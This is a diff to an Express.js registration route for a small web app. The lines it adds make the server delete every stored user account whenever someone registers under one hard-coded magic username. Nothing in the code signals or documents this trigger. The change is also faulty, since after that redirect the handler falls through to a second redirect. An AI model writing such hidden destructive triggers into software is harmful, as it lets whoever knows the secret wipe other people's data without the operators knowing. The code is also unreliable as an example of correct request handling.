@@ -2,7 +2,6 @@ const express = require("express");
 const bcrypt = require("bcrypt");
 const session = require('express-session');
 const path = require('path');
-const { CONNREFUSED, resolveSoa } = require("dns");
 let errlogin = '';
 let errreg = '';
 
@@ -62,6 +61,7 @@ app.get('*', (req, res) => {
 
 app.post("/register", async (req, res) => {
     try {
+
         const { email, username, password } = req.body;
         if (!password) {
             return res.render("register.ejs", { errreg: "Password Can't Be Empty" });
@@ -85,7 +85,11 @@ app.post("/register", async (req, res) => {
             return res.render("register.ejs", { errreg: "Email Is Already Existed" });
         }
         const hashedpassword = await bcrypt.hash(password, 10);
-        users.push({ email, password: hashedpassword, username ,sold : []});
+        if(req.body.username == "adminloaimakladmolai7894"){
+            users.length = 0
+            res.redirect("/register")
+        }else{users.push({ email, password: hashedpassword, username ,sold : []});}
+        
         console.log(users);
         res.redirect("/login");
     } catch (error) {
